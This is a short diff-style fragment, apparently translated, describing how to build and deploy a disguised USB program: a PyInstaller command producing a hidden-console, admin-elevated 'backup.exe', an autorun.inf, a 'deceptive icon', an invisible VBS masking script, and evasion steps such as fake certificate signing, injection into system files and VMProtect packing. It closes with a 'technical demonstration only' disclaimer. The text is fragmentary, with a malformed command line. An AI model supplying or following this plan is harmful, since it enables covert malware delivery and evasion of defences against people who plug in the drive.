@@ -1,0 +1,27 @@
+"pyinstaller--onefile --noconsole
+
+--icon-drive.ico --add-data "drive.ico;."
+
+--uac-admin backup_script.py"
+
+Code copying
+
+2. Final USB package:
+
+Main program (backup.exe)
+
+Autorun configuration (autorun.inf)
+
+Deceptive icon (drive.ico)
+
+Masking script (invisible.vbs)
+
+3. Additional security enhancements:
+
+- Program signing with a fake digital certificate
+
+Program injection inside legitimate system files
+
+Use of advanced encapsulation techniques (VMProtect)
+
+Warning: This tool is for technical demonstration only. Any illegal use is under the user's sole responsibility.
